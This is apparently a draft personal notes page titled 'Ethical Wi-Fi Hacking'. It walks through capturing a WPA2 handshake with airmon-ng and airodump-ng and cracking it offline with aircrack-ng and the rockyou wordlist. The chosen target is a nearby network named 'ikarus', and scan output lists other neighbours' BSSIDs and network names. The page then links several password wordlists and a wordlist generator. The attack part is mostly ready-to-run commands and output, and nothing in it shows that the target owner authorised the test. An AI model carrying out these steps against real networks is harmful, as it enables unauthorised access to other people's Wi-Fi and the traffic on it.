---
title: Linux - Ethical Wi-Fi Hacking
date: 2025-10-13 12:57:54
description:
tags:
  - linux
aliases:
draft: true
---
Install Kali Linux

Attach a Wi-Fi dongle which has monitoring feature. Most built-in WiFi cards do not have such option. so using an external antenna is a must.

```shell
# List available interfaces
sudo airmon-ng
```

The output will be similar to the following one. `wlan1` is the external Wi-Fi card.

```shell
PHY	Interface	Driver		Chipset

phy0	wlan0		ath9k		Qualcomm Atheros AR9485 Wireless Network Adapter (rev 01)
phy1	wlan1		ath9k_htc	Qualcomm Atheros Communications AR9271 802.11n

```


Enable monitor mode for the `wlan1` device. 

```shell
sudo airmon-ng start wlan1
```


Check if it is setup properly.
```shell
iwconfig
```

Notice the change on `wlan1` adapter from `wlan1mon  IEEE 802.11  Mode:Managed` to `wlan1mon  IEEE 802.11  Mode:Monitor`

```shell {14-16}
lo        no wireless extensions.

eth0      no wireless extensions.

wlan0     IEEE 802.11  ESSID:"Zyxel_59C1_2.4GHz"  
          Mode:Managed  Frequency:2.417 GHz  Access Point: 7C:77:16:7B:59:C1   
          Bit Rate=65 Mb/s   Tx-Power=15 dBm   
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Power Management:off
          Link Quality=69/70  Signal level=-41 dBm  
          Rx invalid nwid:0  Rx invalid crypt:0  Rx invalid frag:0
          Tx excessive retries:0  Invalid misc:56   Missed beacon:0

wlan1mon  IEEE 802.11  Mode:Monitor  Frequency:2.457 GHz  Tx-Power=20 dBm   
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Power Management:off

```


Start capturing the Wi-Fi signals around yourself.
```shell
sudo airodump-ng wlan1mon
```

Copy the BSSID and CH of the target. You will use them to capture handshake

```shell
 BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

  

 F8:73:1A:A5:0A:F2  -76        3        0    0   8  360   WPA2 CCMP   PSK  TurkNet1000Mbps_50AF2                                                                        

 6C:E8:73:F4:73:66  -97        2        0    0  11  130   WPA2 CCMP   PSK  Rocks                                                                                        

 48:BD:4A:B1:02:F2   -1        0        0    0  -1   -1                    <length:  0>                                                                                 

 F4:FC:49:2B:8A:92  -72        6        0    0   9  360   WPA2 CCMP   PSK  FiberHGW_ZTX9FH                                                                              

 E4:4E:12:62:8D:19  -79        8        0    0   9  360   WPA2 CCMP   PSK  FiberHGW_ZTF34X                                                                              

 D8:E8:44:FB:72:58  -90        3        0    0   2  360   WPA2 CCMP   PSK  TURKNET_B7258                                                                                

 DE:62:79:5C:89:2F  -83        2        0    0   1  360   WPA2 CCMP   PSK  <length:  0>                                                                                 

 4C:C5:3E:01:24:F1  -87        2        0    0   2  270   WPA2 CCMP   PSK  Firuz                                                                                        

 E0:B6:68:A1:EB:AC  -72        5        0    0   1  130   WPA2 CCMP   PSK  ikarus
```


Capture hand-shake for ikarus
```shell
sudo airodump-ng -c 1 --bssid E0:B6:68:A1:EB:AC -w . wlan1mon
```

Now we wait... Once you've captured a handshake, you should see something like `[ WPA handshake: bc:d3:c9:ef:d2:67` at the top right of the screen, just right of the current time.

```shell
 CH  1 ][ Elapsed: 10 mins ][ 2025-10-13 13:29 ][ WPA handshake: E0:B6:68:A1:EB:AC
```


Grab the latest `.cap` file and rename to make it visible

```shell
mv ./.-03.cap hackme.cap
```


If you're cracking static WEP key network instead of a WPA/WPA2-PSK network, replace -a2 with -a1.

```shell
# unzip the word list
sudo gzip -d /usr/share/wordlists/rockyou.txt.gz

# Run the cracker
sudo aircrack-ng -a2 -b E0:B6:68:A1:EB:AC -w /usr/share/wordlists/rockyou.txt hackme.cap
```


## Tools
⭐️ [Genymobile/scrcpy: ](https://github.com/Genymobile/scrcpy) Display and control your Android device. This application mirrors Android devices (video and audio) connected via USB or [TCP/IP](https://github.com/Genymobile/scrcpy/blob/master/doc/connection.md#tcpip-wireless) and allows control using the computer's keyboard and mouse. It does not require _root_ access or an app installed on the device. It works on _Linux_, _Windows_, and _macOS_.

## Resources
- Wordlist repo → [Probable-Wordlists/Real-Passwords/WPA-Length at master · berzerk0/Probable-Wordlists · GitHub](https://github.com/berzerk0/Probable-Wordlists/tree/master/Real-Passwords/WPA-Length)
- TR list → [GitHub - kaganoglu/turkce-pass-wordlist](https://github.com/kaganoglu/turkce-pass-wordlist)
- ⌛ wpa2-wordlists → [Kenny](https://github.com/kennyn510/wpa2-wordlists)
	- rockyou
		- 0-9.txt 
		- A.txt, B.txt, C.txt, D, E, F, G, H, I, J
	- Bigone2016
		- A, 
- Not tested → [GitHub - rwx-777/WPA2-FritzBox-Pswd-Wordlist-Generator: This Script will produce all of the WPA2 Passwords used by various Router companies aswell as Fritzbox. All of these Passwords will be 16 Numbers in length. So it could get a bit large.](https://github.com/rwx-777/WPA2-FritzBox-Pswd-Wordlist-Generator)
- Not tested → [GitHub - noder-ss/my-wordlists: Wordlists](https://github.com/noder-ss/my-wordlists)
- Not tested → [GitHub - kakulanex/wifi-wordlist: Wifi wordlist for cracking WPA, WPA2, WPS](https://github.com/kakulanex/wifi-wordlist)
- Pasword list generator → [GitHub - 5huu/password-list-generator: A tool that generates every possible password from a given set of words and/or numbers.](https://github.com/5huu/password-list-generator)